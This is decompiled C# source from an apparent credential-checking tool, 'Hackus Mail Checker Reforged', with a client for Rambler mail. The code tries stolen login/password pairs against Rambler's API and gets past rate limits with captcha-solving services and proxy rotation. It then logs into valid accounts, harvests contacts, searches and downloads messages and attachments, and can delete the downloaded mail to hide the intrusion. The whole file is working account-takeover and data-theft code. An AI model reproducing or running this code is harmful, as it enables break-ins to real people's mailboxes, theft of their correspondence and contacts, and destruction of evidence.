using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Text;
using System.Text.RegularExpressions;
using System.Threading;
using Hackus_Mail_Checker_Reforged.Helpers;
using Hackus_Mail_Checker_Reforged.Models;
using Hackus_Mail_Checker_Reforged.Models.Enums;
using Hackus_Mail_Checker_Reforged.Net.Mail.Message;
using Hackus_Mail_Checker_Reforged.Net.Web.Rambler;
using Hackus_Mail_Checker_Reforged.Services.Managers;
using Hackus_Mail_Checker_Reforged.Services.Settings;
using Newtonsoft.Json;
using xNet;

namespace Hackus_Mail_Checker_Reforged.Net
{
	// Token: 0x020000AC RID: 172
	public class RamblerClientNew
	{
		// Token: 0x17000136 RID: 310
		// (get) Token: 0x0600057C RID: 1404 RVA: 0x00006D62 File Offset: 0x00004F62
		private SearchSettings SearchSettings
		{
			get
			{
				return SearchSettings.Instance;
			}
		}

		// Token: 0x0600057D RID: 1405 RVA: 0x00009C12 File Offset: 0x00007E12
		public RamblerClientNew(Mailbox mailbox)
		{
			this._mailbox = mailbox;
		}

		// Token: 0x0600057E RID: 1406 RVA: 0x00021EE8 File Offset: 0x000200E8
		public void Handle()
		{
			if (this._mailbox.Address == null)
			{
				return;
			}
			OperationResult operationResult = this.Login();
			StatisticsManager.Instance.Increment(operationResult);
			FileManager.SaveStatistics(this._mailbox.Address, this._mailbox.Password, operationResult);
			if (operationResult == OperationResult.Ok)
			{
				this.ProcessValid();
				if (!SearchSettings.Instance.Search)
				{
					MailManager.Instance.AddResult(new MailboxResult(this._mailbox));
				}
			}
		}

		// Token: 0x0600057F RID: 1407 RVA: 0x00021F5C File Offset: 0x0002015C
		public OperationResult Login()
		{
			int num = 0;
			OperationResult operationResult2;
			for (;;)
			{
				this.Reset();
				OperationResult operationResult = this.CreateSession();
				if (operationResult == OperationResult.Captcha)
				{
					if (WebSettings.Instance.SolveCaptcha && !string.IsNullOrEmpty(WebSettings.Instance.CaptchaSolvationKey))
					{
						operationResult2 = this.CreateOrder();
						if (operationResult2 == OperationResult.Error)
						{
							break;
						}
						if (operationResult2 == OperationResult.HttpError)
						{
							continue;
						}
						ValueTuple<OperationResult, string> valueTuple = CaptchaHelpers.CreateInstance().SolveCaptcha(this._orderValue.Replace("\\/", "/"), "ru", true);
						OperationResult item = valueTuple.Item1;
						string item2 = valueTuple.Item2;
						if (item == OperationResult.Error)
						{
							return item;
						}
						if (item == OperationResult.HttpError)
						{
							continue;
						}
						this._orderValue = item2.ToUpper();
						OperationResult operationResult3 = this.CreatePassToken();
						if (operationResult3 == OperationResult.Error)
						{
							return operationResult3;
						}
						if (operationResult3 == OperationResult.HttpError)
						{
							continue;
						}
						operationResult = this.CreateWebSesssion();
					}
					else
					{
						if (!ProxySettings.Instance.UseProxy)
						{
							return OperationResult.Captcha;
						}
						if (WebSettings.Instance.RebruteCaptcha && num < WebSettings.Instance.RebruteCaptchaLimit)
						{
							num++;
							continue;
						}
						return OperationResult.Captcha;
					}
				}
				if (operationResult != OperationResult.HttpError)
				{
					return operationResult;
				}
			}
			return operationResult2;
		}

		// Token: 0x06000580 RID: 1408 RVA: 0x0002207C File Offset: 0x0002027C
		private OperationResult CreateSession()
		{
			this.WaitPause();
			OperationResult result;
			try
			{
				using (HttpRequest httpRequest = new HttpRequest())
				{
					this.SetHeaders(httpRequest);
					string text = string.Concat(new string[]
					{
						"{\"method\":\"Rambler::Id::create_session\",\"params\":[{\"short_session\":0,\"via\":{\"project\":\"mail\",\"type\":\"embed\"},\"utm\":{\"referer\":\"https://mail.rambler.ru/\"},\"login\":\"",
						this._mailbox.Address,
						"\",\"password\":\"",
						this._mailbox.Password,
						"\",\"encrypted\":0}],\"rpc\":\"2.0\"}"
					});
					string text2 = httpRequest.Post("https://id.rambler.ru/jsonrpc", text, "application/json").ToString();
					if (text2.Contains("Rate limit exceed"))
					{
						result = OperationResult.Captcha;
					}
					else if (text2.Contains("incorrect password"))
					{
						result = OperationResult.Bad;
					}
					else if (!text2.Contains("Suspicious session credentials") && !text2.Contains("hijacked") && !text2.Contains("unblock"))
					{
						if (!text2.Contains("rsid"))
						{
							StatisticsManager.Instance.AddErrorDetails(this._mailbox.Address, text2);
							result = OperationResult.Error;
						}
						else
						{
							result = OperationResult.Ok;
						}
					}
					else
					{
						result = OperationResult.Blocked;
					}
				}
			}
			catch (ThreadAbortException)
			{
				throw;
			}
			catch
			{
				result = OperationResult.HttpError;
			}
			return result;
		}

		// Token: 0x06000581 RID: 1409 RVA: 0x00022204 File Offset: 0x00020404
		private OperationResult CreateWebSesssion()
		{
			if (this._passId != null && this._passValue != null)
			{
				for (int i = 0; i < 2; i++)
				{
					this.WaitPause();
					try
					{
						using (HttpRequest httpRequest = new HttpRequest())
						{
							this.SetHeaders(httpRequest);
							string text = string.Concat(new string[]
							{
								"{\"method\":\"Rambler::Id::create_web_session\",\"params\":[{\"login\":\"",
								this._mailbox.Address,
								"\",\"password\":\"",
								this._mailbox.Password,
								"\",\"__rlPassId\":\"",
								this._passId,
								"\",\"__rlPassValue\":\"",
								this._passValue,
								"\"}],\"rpc\":\"2.0\"}"
							});
							string text2 = httpRequest.Post("https://id.rambler.ru/jsonrpc", text, "application/json").ToString();
							if (text2.Contains("incorrect password"))
							{
								return OperationResult.Bad;
							}
							if (text2.Contains("Suspicious session credentials") || text2.Contains("hijacked") || text2.Contains("unblock"))
							{
								return OperationResult.Blocked;
							}
							if (!text2.Contains("rsid"))
							{
								StatisticsManager.Instance.AddErrorDetails(this._mailbox.Address, text2);
								return OperationResult.Error;
							}
							return OperationResult.Ok;
						}
					}
					catch (ThreadAbortException)
					{
						throw;
					}
					catch
					{
					}
				}
				return OperationResult.HttpError;
			}
			return OperationResult.Error;
		}

		// Token: 0x06000582 RID: 1410 RVA: 0x000223D0 File Offset: 0x000205D0
		private OperationResult CreateOrder()
		{
			for (int i = 0; i < 2; i++)
			{
				this.WaitPause();
				try
				{
					using (HttpRequest httpRequest = new HttpRequest())
					{
						this.SetHeaders(httpRequest);
						string text = "{\"method\":\"Rambler::Common::create_rpc_order\",\"params\":[{\"method\":\"Rambler::Common::create_rate_limit_pass_token\",\"useBase64\":1,\"key\":\"AllowedRedirectDomains\"}],\"rpc\":\"2.0\"}";
						string input = httpRequest.Post("https://id.rambler.ru/jsonrpc", text, "application/json").ToString();
						Match match = Regex.Match(input, "\"orderId\":\"(.+?)\"");
						if (!match.Success)
						{
							return OperationResult.Error;
						}
						this._orderId = match.Groups[1].Value;
						match = Regex.Match(input, "\"orderValue.b64\":\"(.+?)\"");
						if (match.Success)
						{
							this._orderValue = match.Groups[1].Value;
							return OperationResult.Ok;
						}
						return OperationResult.Error;
					}
				}
				catch (ThreadAbortException)
				{
					throw;
				}
				catch
				{
				}
			}
			return OperationResult.HttpError;
		}

		// Token: 0x06000583 RID: 1411 RVA: 0x000224E0 File Offset: 0x000206E0
		private OperationResult CreatePassToken()
		{
			if (this._orderId != null && this._orderValue != null)
			{
				for (int i = 0; i < 2; i++)
				{
					this.WaitPause();
					try
					{
						using (HttpRequest httpRequest = new HttpRequest())
						{
							this.SetHeaders(httpRequest);
							string text = string.Concat(new string[]
							{
								"{\"method\":\"Rambler::Common::create_rate_limit_pass_token\",\"params\":[{\"method\":\"Rambler::Id::create_web_session\",\"__rpcOrderId\":\"",
								this._orderId,
								"\",\"__rpcOrderValue\":\"",
								this._orderValue,
								"\",\"parameters\":{\"login\":\"",
								this._mailbox.Address,
								"\",\"password\":\"",
								this._mailbox.Password,
								"\"}}],\"rpc\":\"2.0\"}"
							});
							string text2 = httpRequest.Post("https://id.rambler.ru/jsonrpc", text, "application/json").ToString();
							if (text2.Contains("reissue order"))
							{
								return OperationResult.HttpError;
							}
							Match match = Regex.Match(text2, "\"passId\":\"(.+?)\"");
							if (!match.Success)
							{
								Console.WriteLine(text2);
								return OperationResult.Error;
							}
							this._passId = match.Groups[1].Value;
							match = Regex.Match(text2, "\"passValue\":\"(.+?)\"");
							if (!match.Success)
							{
								return OperationResult.Error;
							}
							this._passValue = match.Groups[1].Value;
							return OperationResult.Ok;
						}
					}
					catch (ThreadAbortException)
					{
						throw;
					}
					catch
					{
					}
				}
				return OperationResult.HttpError;
			}
			return OperationResult.Error;
		}

		// Token: 0x06000584 RID: 1412 RVA: 0x000226BC File Offset: 0x000208BC
		private OperationResult DownloadContacts()
		{
			this.WaitPause();
			try
			{
				using (HttpRequest httpRequest = new HttpRequest())
				{
					this.SetHeaders(httpRequest);
					string text = "{\"method\":\"Rambler::Mail::get_contacts\",\"rpc\":\"2.0\"}";
					foreach (object obj in Regex.Matches(httpRequest.Post("https://mail.rambler.ru/api/v2", text, "application/json").ToString(), "\"email\": \"(.+?)\""))
					{
						FileManager.SaveContact(((Match)obj).Groups[1].Value);
					}
					return OperationResult.Ok;
				}
			}
			catch (ThreadAbortException)
			{
				throw;
			}
			catch
			{
			}
			return OperationResult.Retry;
		}

		// Token: 0x06000585 RID: 1413 RVA: 0x000227A8 File Offset: 0x000209A8
		public void ProcessValid()
		{
			if (!this.SearchSettings.Search && !SearchSettings.Instance.ParseContacts && (!this.SearchSettings.SearchAttachments || this.SearchSettings.SearchAttachmentsMode != SearchAttachmentsMode.Everywhere))
			{
				return;
			}
			OperationResult operationResult = OperationResult.Retry;
			int num = 0;
			bool flag = false;
			bool flag2 = false;
			bool flag3 = false;
			bool flag4 = false;
			bool flag5 = false;
			bool flag6 = false;
			List<Request> list = new List<Request>();
			Queue<Uid> queue = null;
			List<Uid> list2 = new List<Uid>();
			while (operationResult == OperationResult.Retry)
			{
				if (num <= 2)
				{
					if (!flag && SearchSettings.Instance.ParseContacts)
					{
						operationResult = this.DownloadContacts();
						if (operationResult == OperationResult.Ok || operationResult == OperationResult.Bad)
						{
							flag = true;
						}
					}
					else
					{
						operationResult = OperationResult.Ok;
					}
					if (operationResult != OperationResult.Retry)
					{
						if (!flag2 && this.SearchSettings.Search)
						{
							operationResult = this.SearchMessages(list);
							if (operationResult == OperationResult.Ok)
							{
								flag2 = true;
							}
						}
						else
						{
							operationResult = OperationResult.Ok;
						}
						if (operationResult != OperationResult.Retry)
						{
							if (operationResult != OperationResult.Bad)
							{
								if (!flag3 && this.SearchSettings.SearchAttachments && this.SearchSettings.SearchAttachmentsMode == SearchAttachmentsMode.Everywhere)
								{
									operationResult = this.SearchAttachments(ref queue);
									if (operationResult == OperationResult.Ok || operationResult == OperationResult.Bad)
									{
										flag3 = true;
									}
								}
								else
								{
									operationResult = OperationResult.Ok;
								}
								if (operationResult != OperationResult.Retry)
								{
									if (!flag4 && this.SearchSettings.DeleteWhenDownloaded)
									{
										foreach (Request request in list)
										{
											list2.AddRange(request.SavedUids);
										}
										flag4 = true;
									}
									else
									{
										operationResult = OperationResult.Ok;
									}
									list2 = new List<Uid>(list2.Distinct<Uid>());
									if (!flag6 && list2.Any<Uid>())
									{
										if (!flag5)
										{
											operationResult = this.MoveMessages(list2, MoveDestination.Trash);
											if (operationResult == OperationResult.Ok)
											{
												flag5 = true;
											}
										}
										if (operationResult == OperationResult.Ok)
										{
											operationResult = this.MoveMessages(list2, MoveDestination.Delete);
											if (operationResult == OperationResult.Ok)
											{
												flag6 = true;
											}
										}
										if (operationResult == OperationResult.Bad)
										{
											flag5 = true;
											flag6 = true;
											break;
										}
									}
									else
									{
										operationResult = OperationResult.Ok;
									}
									if (operationResult == OperationResult.Retry && ProxySettings.Instance.UseProxy)
									{
										this._proxyClient = ProxyManager.Instance.GetProxy();
										continue;
									}
									continue;
								}
								else
								{
									if (ProxySettings.Instance.UseProxy)
									{
										this._proxyClient = ProxyManager.Instance.GetProxy();
										continue;
									}
									continue;
								}
							}
						}
						else
						{
							if (ProxySettings.Instance.UseProxy)
							{
								this._proxyClient = ProxyManager.Instance.GetProxy();
								continue;
							}
							continue;
						}
					}
					else
					{
						if (ProxySettings.Instance.UseProxy)
						{
							this._proxyClient = ProxyManager.Instance.GetProxy();
							continue;
						}
						continue;
					}
				}
				IL_230:
				foreach (Request request2 in list)
				{
					int count = request2.Count;
					if (count > 0 && (!this.SearchSettings.UseSearchLimit || this.SearchSettings.SearchLimit <= count))
					{
						MailboxResult result = new MailboxResult(this._mailbox, request2.ToString(), count);
						MailManager.Instance.AddResult(result);
						StatisticsManager.Instance.IncrementFound();
						FileManager.SaveFound(this._mailbox.Address, this._mailbox.Password, request2.ToString(), count);
					}
				}
				return;
			}
			goto IL_230;
		}

		// Token: 0x06000586 RID: 1414 RVA: 0x00022AB0 File Offset: 0x00020CB0
		private OperationResult SearchMessages(List<Request> checkedRequests)
		{
			using (IEnumerator<Request> enumerator = this.SearchSettings.Requests.GetEnumerator())
			{
				while (enumerator.MoveNext())
				{
					Request request = enumerator.Current;
					Request request3 = checkedRequests.FirstOrDefault((Request r) => r.Sender == request.Sender && r.Body == request.Body && r.Subject == request.Subject);
					if (request3 == null)
					{
						request3 = request.Clone();
						request3.FindedUids = new HashSet<Uid>();
						request3.SavedUids = new HashSet<Uid>();
						checkedRequests.Add(request3);
					}
					else if (request3.IsChecked || (request3.SavedUids != null && request3.SavedUids.Count >= this.SearchSettings.DownloadLettersLimit))
					{
						continue;
					}
					Request request2 = request3;
					if (!request2.FindedUids.Any<Uid>())
					{
						OperationResult operationResult = this.Search(request2);
						if (operationResult == OperationResult.Error)
						{
							request2.IsChecked = true;
							continue;
						}
						if (operationResult == OperationResult.HttpError)
						{
							return OperationResult.Retry;
						}
					}
					if (this.SearchSettings.DownloadLetters)
					{
						if (CheckerSettings.Instance.UsePop3Limit && request2.FindedUids.Count > CheckerSettings.Instance.Pop3Limit)
						{
							request3.FindedUids = new HashSet<Uid>(request3.FindedUids.Take(CheckerSettings.Instance.Pop3Limit));
						}
						using (HashSet<Uid>.Enumerator enumerator2 = request3.FindedUids.GetEnumerator())
						{
							while (enumerator2.MoveNext())
							{
								Uid uid = enumerator2.Current;
								if (!request3.SavedUids.Any((Uid u) => u == uid))
								{
									if (request3.SavedUids.Count >= this.SearchSettings.DownloadLettersLimit)
									{
										break;
									}
									MailMessage message;
									OperationResult operationResult2 = this.FetchMessage(uid, this.SearchSettings.SearchAttachments && this.SearchSettings.SearchAttachmentsMode == SearchAttachmentsMode.InDownloaded, out message);
									if (operationResult2 == OperationResult.Error)
									{
										request3.SavedUids.Add(uid);
									}
									else
									{
										if (operationResult2 == OperationResult.HttpError)
										{
											return OperationResult.Retry;
										}
										request3.SavedUids.Add(uid);
										FileManager.SaveWebLetter(this._mailbox.Address, this._mailbox.Password, request3.ToString(), message);
									}
								}
							}
						}
					}
					request2.IsChecked = true;
				}
			}
			return OperationResult.Ok;
		}

		// Token: 0x06000587 RID: 1415 RVA: 0x00022D40 File Offset: 0x00020F40
		private OperationResult SearchAttachments(ref Queue<Uid> leftAttachmentMessages)
		{
			this.WaitPause();
			if (leftAttachmentMessages == null)
			{
				OperationResult result;
				try
				{
					using (HttpRequest httpRequest = new HttpRequest())
					{
						this.SetHeaders(httpRequest);
						string text = "{\"method\":\"Rambler::Mail::get_folder_messages\",\"params\":[{\"folder.offset\":0,\"folder.elements\":30,\"folder.sortorder\":\"D\",\"filter\":{\"text\":\"\",\"attachment\":1}}],\"rpc\":\"2.0\"}";
						string input = httpRequest.Post("https://mail.rambler.ru/api/v2", text, "application/json").ToString();
						leftAttachmentMessages = new Queue<Uid>();
						if (!Regex.Match(input, "\"status\":\"OK\"").Success)
						{
							return OperationResult.Ok;
						}
						foreach (object obj in Regex.Matches(input, "\"uid\":(.+?),"))
						{
							Match match = (Match)obj;
							leftAttachmentMessages.Enqueue(new Uid(match.Groups[1].Value));
						}
					}
					goto IL_FE;
				}
				catch (ThreadAbortException)
				{
					throw;
				}
				catch
				{
					result = OperationResult.Retry;
				}
				return result;
			}
			IL_FE:
			while (leftAttachmentMessages.Any<Uid>())
			{
				Uid uid = leftAttachmentMessages.Dequeue();
				MailMessage mailMessage;
				if (this.FetchMessage(uid, true, out mailMessage) == OperationResult.HttpError)
				{
					return OperationResult.Retry;
				}
			}
			return OperationResult.Ok;
		}

		// Token: 0x06000588 RID: 1416 RVA: 0x00022E8C File Offset: 0x0002108C
		private OperationResult Search(Request searchRequest)
		{
			this.WaitPause();
			try
			{
				using (HttpRequest httpRequest = new HttpRequest())
				{
					this.SetHeaders(httpRequest);
					string input = httpRequest.Post("https://mail.rambler.ru/api/v2", this.BuildSearchQuery(searchRequest), "application/json").ToString();
					Match match = Regex.Match(input, "\"status\":\"OK\"");
					if (!match.Success)
					{
						return OperationResult.Error;
					}
					match = Regex.Match(input, "\"total_elements\":(.+?),");
					if (!match.Success)
					{
						return OperationResult.Error;
					}
					searchRequest.Count = int.Parse(match.Groups[1].Value);
					foreach (object obj in Regex.Matches(input, "\"uid\":(.+?),"))
					{
						Match match2 = (Match)obj;
						searchRequest.FindedUids.Add(new Uid(match2.Groups[1].Value));
					}
					return OperationResult.Ok;
				}
			}
			catch (ThreadAbortException)
			{
				throw;
			}
			catch
			{
			}
			return OperationResult.HttpError;
		}

		// Token: 0x06000589 RID: 1417 RVA: 0x00023018 File Offset: 0x00021218
		private OperationResult FetchMessage(Uid uid, bool downloadAttachments, out MailMessage message)
		{
			this.WaitPause();
			message = new MailMessage();
			try
			{
				using (HttpRequest httpRequest = new HttpRequest())
				{
					this.SetHeaders(httpRequest);
					string text = "{\"method\":\"Rambler::Mail::render_message\",\"params\":[{\"folder.name\":\"INBOX\",\"message.uid\":\"" + uid.UID.ToString() + "\"}],\"rpc\":\"2.0\"}";
					string input = httpRequest.Post("https://mail.rambler.ru/rpc", text, "application/json").ToString();
					Match match = Regex.Match(input, "\"subject\":(.+?),");
					if (!match.Success)
					{
						return OperationResult.Error;
					}
					message.Subject = match.Groups[1].Value;
					match = Regex.Match(input, "\"rdate\":(.+?),");
					if (!match.Success)
					{
						return OperationResult.Error;
					}
					long unixTimeStamp = long.Parse(match.Groups[1].Value);
					message.Date = DateHelpers.UnixTimeStampToDate(unixTimeStamp);
					match = Regex.Match(input, "\"html\":\"(.+?)\",\"lines\"");
					if (!match.Success)
					{
						return OperationResult.Error;
					}
					message.AlternateViews.Add(new Attachment("text/html", match.Groups[1].Value));
					match = Regex.Match(input, "\"from\":\\[.+?,\"(.+?)\",\"(.+?)\"\\]");
					if (match.Success)
					{
						message.From = match.Groups[1].Value + "@" + match.Groups[2].Value;
						if (downloadAttachments)
						{
							try
							{
								match = Regex.Match(input, "\"attachments\":(.+?),\"attachments");
								if (match.Success)
								{
									AttachmentInfo[] array = JsonConvert.DeserializeObject<AttachmentInfo[]>(match.Groups[1].Value);
									for (int i = 0; i < array.Length; i++)
									{
										AttachmentInfo attachment = array[i];
										if (!SearchSettings.Instance.UseAttachmentFilters || SearchSettings.Instance.AttachmentFilters.Any((string filter) => attachment.Name.ContainsIgnoreCase(filter)))
										{
											Attachment attachment2 = this.FetchAttachment(attachment);
											if (attachment2 != null)
											{
												FileManager.SaveAttachment(attachment2, this._mailbox.Address);
											}
										}
									}
								}
							}
							catch
							{
							}
						}
						return OperationResult.Ok;
					}
					return OperationResult.Error;
				}
			}
			catch (ThreadAbortException)
			{
				throw;
			}
			catch
			{
			}
			return OperationResult.HttpError;
		}

		// Token: 0x0600058A RID: 1418 RVA: 0x000232F0 File Offset: 0x000214F0
		private Attachment FetchAttachment(AttachmentInfo attachmentInfo)
		{
			this.WaitPause();
			try
			{
				using (HttpRequest httpRequest = new HttpRequest())
				{
					this.SetHeaders(httpRequest);
					MemoryStream memoryStream = httpRequest.Get("https://mail.rambler.ru" + attachmentInfo.Url, null).ToMemoryStream();
					if (memoryStream != null && memoryStream.Length != 0L)
					{
						return new Attachment
						{
							Name = attachmentInfo.Name,
							Body = memoryStream.ToArray()
						};
					}
					return null;
				}
			}
			catch (ThreadAbortException)
			{
				throw;
			}
			catch
			{
			}
			return null;
		}

		// Token: 0x0600058B RID: 1419 RVA: 0x0002339C File Offset: 0x0002159C
		private OperationResult MoveMessages(List<Uid> uids, MoveDestination destination)
		{
			this.WaitPause();
			OperationResult result;
			try
			{
				using (HttpRequest httpRequest = new HttpRequest())
				{
					this.SetHeaders(httpRequest);
					StringBuilder stringBuilder = new StringBuilder("[");
					for (int i = 0; i < uids.Count; i++)
					{
						stringBuilder.Append(uids[i].UID);
						if (i != uids.Count - 1)
						{
							stringBuilder.Append(",");
						}
					}
					stringBuilder.Append("]");
					string text;
					if (destination == MoveDestination.Trash)
					{
						text = "{\"method\":\"Rambler::Mail::move_message\",\"params\":[{\"old.folder.name\":\"INBOX\",\"new.folder.name\":\"Trash\",\"message.uid\":" + stringBuilder.ToString() + "}],\"rpc\":\"2.0\"}";
					}
					else
					{
						text = "{\"method\":\"Rambler::Mail::delete_message\",\"params\":[{\"folder.name\":\"Trash\",\"message.uid\":" + stringBuilder.ToString() + "}],\"rpc\":\"2.0\"}";
					}
					string text2 = httpRequest.Post("https://mail.rambler.ru/api/v2", text, "application/json").ToString();
					if (!text2.Contains("\"status\":\"OK\""))
					{
						result = OperationResult.Bad;
					}
					else
					{
						Match match = Regex.Match(text2, "\"destination\\.uid\":\\[(.+?)\\]");
						if (match.Success)
						{
							uids.Clear();
							foreach (string uid in match.Groups[1].Value.Split(new char[]
							{
								','
							}))
							{
								uids.Add(new Uid(uid));
							}
						}
						result = OperationResult.Ok;
					}
				}
			}
			catch (ThreadAbortException)
			{
				throw;
			}
			catch
			{
				result = OperationResult.Retry;
			}
			return result;
		}

		// Token: 0x0600058C RID: 1420 RVA: 0x00009C21 File Offset: 0x00007E21
		private void Reset()
		{
			this._cookies = new CookieDictionary(false);
			if (ProxySettings.Instance.UseProxy)
			{
				this._proxyClient = ProxyManager.Instance.GetProxy();
			}
		}

		// Token: 0x0600058D RID: 1421 RVA: 0x00023578 File Offset: 0x00021778
		private void SetHeaders(HttpRequest request)
		{
			request.IgnoreProtocolErrors = true;
			request.ConnectTimeout = CheckerSettings.Instance.Timeout * 1000;
			request.Cookies = this._cookies;
			request.Proxy = this._proxyClient;
			request.UserAgent = "Mozilla/5.0 (iPhone; CPU iPhone OS 13_3_1 like Mac OS X) AppleWebKit/604.1.34 (KHTML, like Gecko) GSA/50.0.197507736 Mobile/17D50 Safari/604.1";
		}

		// Token: 0x0600058E RID: 1422 RVA: 0x000235CC File Offset: 0x000217CC
		private string BuildSearchQuery(Request request)
		{
			StringBuilder stringBuilder = new StringBuilder("{\"method\":\"Rambler::Mail::get_folder_messages\",\"params\":[{\"folder.name\":\"INBOX\",\"folder.offset\":0,\"folder.elements\":");
			stringBuilder.Append(SearchSettings.Instance.DownloadLetters ? SearchSettings.Instance.DownloadLettersLimit : 1);
			stringBuilder.Append(",\"folder.sortorder\":\"D\",\"filter\":{");
			if (request.Sender != null)
			{
				stringBuilder.Append("\"from\":\"" + request.Sender + "\",");
			}
			if (request.Body == null)
			{
				if (request.Subject != null)
				{
					stringBuilder.Append("\"text\":\"" + request.Subject + "\",");
				}
			}
			else
			{
				stringBuilder.Append("\"text\":\"" + request.Body + "\",");
			}
			if (!request.CheckDate)
			{
				if (SearchSettings.Instance.CheckDate)
				{
					if (SearchSettings.Instance.DateFrom != null)
					{
						stringBuilder.Append(string.Format("\"after\":{0},", DateHelpers.DateToUnixTimeStamp(SearchSettings.Instance.DateFrom.Value)));
					}
					if (SearchSettings.Instance.DateTo != null)
					{
						stringBuilder.Append(string.Format("\"before\":{0},", DateHelpers.DateToUnixTimeStamp(SearchSettings.Instance.DateTo.Value)));
					}
				}
			}
			else
			{
				if (request.DateFrom != null)
				{
					stringBuilder.Append(string.Format("\"after\":{0},", DateHelpers.DateToUnixTimeStamp(request.DateFrom.Value)));
				}
				if (request.DateTo != null)
				{
					stringBuilder.Append(string.Format("\"before\":{0},", DateHelpers.DateToUnixTimeStamp(request.DateTo.Value)));
				}
			}
			stringBuilder.Remove(stringBuilder.Length - 1, 1);
			stringBuilder.Append("}}],\"rpc\":\"2.0\"}");
			return stringBuilder.ToString();
		}

		// Token: 0x0600058F RID: 1423 RVA: 0x00009B57 File Offset: 0x00007D57
		private bool IsAboveLimit(int count)
		{
			return !SearchSettings.Instance.UseSearchLimit || count >= SearchSettings.Instance.SearchLimit;
		}

		// Token: 0x06000590 RID: 1424 RVA: 0x00009AC8 File Offset: 0x00007CC8
		private void WaitPause()
		{
			ThreadsManager.Instance.WaitHandle.WaitOne();
		}

		// Token: 0x040002E7 RID: 743
		private Mailbox _mailbox;

		// Token: 0x040002E8 RID: 744
		private ProxyClient _proxyClient;

		// Token: 0x040002E9 RID: 745
		private CookieDictionary _cookies;

		// Token: 0x040002EA RID: 746
		private string _passId;

		// Token: 0x040002EB RID: 747
		private string _passValue;

		// Token: 0x040002EC RID: 748
		private string _orderId;

		// Token: 0x040002ED RID: 749
		private string _orderValue;
	}
}
